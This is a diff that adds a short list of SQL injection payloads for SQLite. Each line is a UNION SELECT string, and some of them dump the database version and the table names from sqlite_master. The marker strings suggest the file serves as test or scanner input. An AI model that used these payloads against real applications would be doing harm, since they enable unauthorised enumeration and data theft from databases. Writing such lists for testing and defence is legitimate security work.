@@ -1,0 +1,5 @@
+' UNION SELECT 'SQLI_UNION_MARKER'--
+' UNION SELECT NULL,'SQLI_UNION_MARKER'--
+' UNION SELECT sqlite_version()--
+' UNION SELECT name FROM sqlite_master--
+' UNION SELECT tbl_name FROM sqlite_master--
